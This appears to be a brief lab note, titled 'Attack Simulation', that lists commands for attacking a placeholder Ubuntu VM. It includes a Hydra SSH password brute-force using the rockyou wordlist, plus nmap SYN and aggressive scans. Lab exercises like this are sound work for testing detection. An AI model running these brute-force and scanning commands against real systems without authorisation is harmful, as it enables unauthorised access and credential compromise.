# Attack Simulation

### SSH Brute Force (Hydra)
```bash
hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://<Ubuntu-IP>
```
```bash
### Port Scanning (Nmap)
nmap -sS -p- <Ubuntu-IP>
```
```bash
### Network Enumeration / Port Probing
nmap -A <ubuntu-vm-ip>
```
